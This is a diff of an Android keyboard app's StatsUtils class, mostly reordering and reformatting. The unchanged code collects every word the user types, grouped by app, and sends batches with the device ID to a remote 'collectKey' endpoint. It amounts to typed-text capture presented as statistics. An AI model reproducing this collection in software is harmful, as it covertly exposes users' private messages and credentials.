@@ -37,26 +37,21 @@ import io.separ.neural.inputmethod.indic.SuggestedWords;
 
 public final class StatsUtils {
 
-    final static MediaType JSON = MediaType.parse("application/json; charset=utf-8");
-    private static StatsUtils instance = null;
-    final int BATCH_SIZE = 25;
-    final OkHttpClient client;
-    public Context latin;
-    HttpUrl.Builder urlBuilder = null;
-    String apiUrl;
     private int revertSwapPuncCount, revertAutoCorrectCount, wordUserTypedCount,
             autoCorrectTypedCount, pickSuggestionCount, backspaceWordDeleteCount,
             backspaceDeleteCount, wordUserTypedBatchCount, autoCorrectTypedBacthCount,
             pickSuggestionBatchCount, subtypeChangeCount, topEmojiSelectedCount,
             richEmojiSelectedCount, snippetToolSelectedCount;
+
+    final int BATCH_SIZE = 25;
+    final static MediaType JSON = MediaType.parse("application/json; charset=utf-8");
+    final OkHttpClient client;
+    HttpUrl.Builder urlBuilder = null;
+    String apiUrl;
+
     private SparseArray<ArrayList<String>> app2lines = new SparseArray<>();
     private StringBuilder currentLine = new StringBuilder();
     private int numOfLines = 0;
-    private int currentPackageHash = 0;
-
-    private StatsUtils() {
-        client = new OkHttpClient();
-    }
 
     private static String checkSum(String s) {
         MessageDigest md = null;
@@ -67,35 +62,25 @@ public final class StatsUtils {
         byte[] digest = md.digest(s.getBytes());
         BigInteger bigInteger = new BigInteger(1, digest);
         String hash = bigInteger.toString(16);
-        while (hash.length() < 32) {
-            hash = "0" + hash;
+        while(hash.length()<32){
+            hash = "0"+hash;
         }
         return hash;
     }
 
-    public static StatsUtils getInstance() {
-        if (instance == null)
-            instance = new StatsUtils();
-        return instance;
-    }
-
-    public static boolean hasInstance() {
-        return (instance != null);
-    }
-
-    private void doSend(final SparseArray<ArrayList<String>> batch) {
+    private void doSend(final SparseArray<ArrayList<String>> batch){
         Log.d("AGAH", "doSendCalled");
-        if (batch == null || batch.size() == 0) {
+        if(batch == null || batch.size() == 0) {
             return;
         }
-        if (urlBuilder == null) {
+        if(urlBuilder == null) {
             urlBuilder = HttpUrl.parse("https://agahkey.ir/api/v0/collectKey").newBuilder();
             apiUrl = urlBuilder.build().toString();
         }
         JSONObject json = new JSONObject();
         long time = System.currentTimeMillis();
         JSONObject events = new JSONObject();
-        for (int i = 0; i < batch.size(); i++) {
+        for(int i = 0; i < batch.size(); i++) {
             int key = batch.keyAt(i);
             ArrayList<String> obj = batch.get(key);
             JSONArray lines = new JSONArray(obj);
@@ -112,7 +97,7 @@ public final class StatsUtils {
             json.put("events", batch);
             String concatenated = Settings.Secure.getString(latin.getContentResolver(), Settings.Secure.ANDROID_ID) + Long.toString(time) + batch.toString();
             json.put("check", checkSum(concatenated));
-        } catch (Throwable t) {
+        }catch (Throwable t){
             return;
         }
         Log.d("AGAH", "requestSent");
@@ -132,17 +117,16 @@ public final class StatsUtils {
         });
     }
 
-    private void addWordToline(String newWord) {
+    private void addWordToline(String newWord){
         currentLine.append(newWord).append(" ");
     }
-
-    private void flushLine(Integer app) {
-        if (app2lines.get(app) == null)
+    private void flushLine(Integer app){
+        if(app2lines.get(app) == null)
             app2lines.put(app, new ArrayList<String>());
         app2lines.get(app).add(currentLine.toString());
         currentLine = new StringBuilder();
         numOfLines += 1;
-        if (numOfLines >= BATCH_SIZE) {
+        if(numOfLines >= BATCH_SIZE){
             doSend(app2lines.clone());
             app2lines.clear();
             numOfLines = 0;
@@ -152,9 +136,24 @@ public final class StatsUtils {
     public void updatePackageName(String currentPackageName) {
         final int previousHash = currentPackageHash;
         currentPackageHash = currentPackageName.hashCode();
-        if (currentLine.length() == 0)
+        if(currentLine.length() == 0)
             return;
         flushLine(previousHash);
+    }
+
+    public Context latin;
+
+
+    private StatsUtils() {
+        client = new OkHttpClient();
+    }
+
+    private static StatsUtils instance = null;
+
+    public static StatsUtils getInstance(){
+        if(instance == null)
+            instance = new StatsUtils();
+        return instance;
     }
 
     public void onCreate(final Context givenLatin) {
@@ -162,16 +161,16 @@ public final class StatsUtils {
     }
 
     public void onPickSuggestionManually(final SuggestedWords suggestedWords,
-                                         final SuggestedWords.SuggestedWordInfo suggestionInfo,
-                                         final DictionaryFacilitator dictionaryFacilitator) {
+                                                final SuggestedWords.SuggestedWordInfo suggestionInfo,
+                                                final DictionaryFacilitator dictionaryFacilitator) {
     }
 
     public void onBackspaceWordDelete(int wordLength) {
-        backspaceWordDeleteCount = createCountLog(backspaceWordDeleteCount, 50, "onBackspaceWordDelete");
+        backspaceWordDeleteCount=createCountLog(backspaceWordDeleteCount, 50, "onBackspaceWordDelete");
     }
 
     public void onBackspacePressed(int lengthToDelete) {
-        backspaceDeleteCount = createCountLog(backspaceDeleteCount, 500, "onBackspacePressed");
+        backspaceDeleteCount=createCountLog(backspaceDeleteCount, 500, "onBackspacePressed");
     }
 
     public void onBackspaceSelectedText(int selectedTextLength) {
@@ -181,32 +180,32 @@ public final class StatsUtils {
     }
 
     public void onRevertAutoCorrect() {
-        revertAutoCorrectCount = createCountLog(revertAutoCorrectCount, 50, "onRevertAutoCorrect");
+        revertAutoCorrectCount=createCountLog(revertAutoCorrectCount, 50, "onRevertAutoCorrect");
     }
 
-    public void onTopEmojiSelected() {
-        topEmojiSelectedCount = createCountLog(topEmojiSelectedCount, 5, "onTopEmojiSelected");
+    public void onTopEmojiSelected(){
+        topEmojiSelectedCount=createCountLog(topEmojiSelectedCount, 5, "onTopEmojiSelected");
     }
 
-    public void onRichEmojiSelected() {
-        richEmojiSelectedCount = createCountLog(richEmojiSelectedCount, 5, "onRichEmojiSelected");
+    public void onRichEmojiSelected(){
+        richEmojiSelectedCount=createCountLog(richEmojiSelectedCount, 5, "onRichEmojiSelected");
     }
 
-    public void onSnippetToolSelected() {
-        snippetToolSelectedCount = createCountLog(snippetToolSelectedCount, 5, "onSnippetToolSelected");
+    public void onSnippetToolSelected(){
+        snippetToolSelectedCount=createCountLog(snippetToolSelectedCount, 5, "onSnippetToolSelected");
     }
 
-    private int createCountLog(int updated, int threshold, String id) {
+    private int createCountLog(int updated, int threshold, String id){
         updated++;
-        if (updated >= threshold) {
+        if(updated >= threshold){
             Bundle bundle = new Bundle();
-            updated = 0;
+                       updated = 0;
         }
         return updated;
     }
 
     public void onRevertSwapPunctuation() {
-        revertSwapPuncCount = createCountLog(revertSwapPuncCount, 50, "onRevertSwapPunctuation");
+        revertSwapPuncCount=createCountLog(revertSwapPuncCount, 50, "onRevertSwapPunctuation");
     }
 
     public void onCreateInputView() {
@@ -216,47 +215,53 @@ public final class StatsUtils {
     }
 
     public void onAutoCorrection(final String typedWord, final String autoCorrectionWord,
-                                 final boolean isBatchInput, final DictionaryFacilitator dictionaryFacilitator,
-                                 final String prevWordsContext) {
+                                        final boolean isBatchInput, final DictionaryFacilitator dictionaryFacilitator,
+                                        final String prevWordsContext) {
     }
 
-    private void addWord(final String commitWord) {
-        if (TextUtils.isEmpty(commitWord))
+    private void addWord(final String commitWord){
+        if(TextUtils.isEmpty(commitWord))
             return;
         addWordToline(commitWord);
     }
 
     public void onWordCommitUserTyped(final String commitWord, final boolean isBatchMode) {
         addWord(commitWord);
-        if (isBatchMode)
-            wordUserTypedBatchCount = createCountLog(wordUserTypedBatchCount, 500, "onWordCommitUserBatchTyped");
+        if(isBatchMode)
+            wordUserTypedBatchCount=createCountLog(wordUserTypedBatchCount, 500, "onWordCommitUserBatchTyped");
         else
-            wordUserTypedCount = createCountLog(wordUserTypedCount, 500, "onWordCommitUserTyped");
+            wordUserTypedCount=createCountLog(wordUserTypedCount, 500, "onWordCommitUserTyped");
     }
 
     public void onWordCommitAutoCorrect(final String commitWord, final boolean isBatchMode) {
         addWord(commitWord);
-        if (isBatchMode)
-            autoCorrectTypedBacthCount = createCountLog(autoCorrectTypedBacthCount, 500, "onWordCommitBatchAutoCorrect");
+        if(isBatchMode)
+            autoCorrectTypedBacthCount=createCountLog(autoCorrectTypedBacthCount, 500, "onWordCommitBatchAutoCorrect");
         else
-            autoCorrectTypedCount = createCountLog(autoCorrectTypedCount, 500, "onWordCommitAutoCorrect");
+            autoCorrectTypedCount=createCountLog(autoCorrectTypedCount, 500, "onWordCommitAutoCorrect");
     }
 
     public void onWordCommitSuggestionPickedManually(
             final String commitWord, final boolean isBatchMode) {
         addWord(commitWord);
-        if (isBatchMode)
-            pickSuggestionBatchCount = createCountLog(pickSuggestionBatchCount, 500, "onPickSuggestionBatchManually");
+        if(isBatchMode)
+            pickSuggestionBatchCount=createCountLog(pickSuggestionBatchCount, 500, "onPickSuggestionBatchManually");
         else
-            pickSuggestionCount = createCountLog(pickSuggestionCount, 500, "onPickSuggestionManually");
+            pickSuggestionCount=createCountLog(pickSuggestionCount, 500, "onPickSuggestionManually");
     }
 
     public void onSubtypeChanged(final InputMethodSubtype newSubtype) {
-        subtypeChangeCount = createCountLog(subtypeChangeCount, 500, "onSubtypeChanged");
+        subtypeChangeCount=createCountLog(subtypeChangeCount, 500, "onSubtypeChanged");
     }
 
     public void onDestroy() {
         instance = null;
+    }
+
+    private int currentPackageHash = 0;
+
+    public static boolean hasInstance() {
+        return (instance!=null);
     }
 
     public void onServiceClicked(String serviceId) {
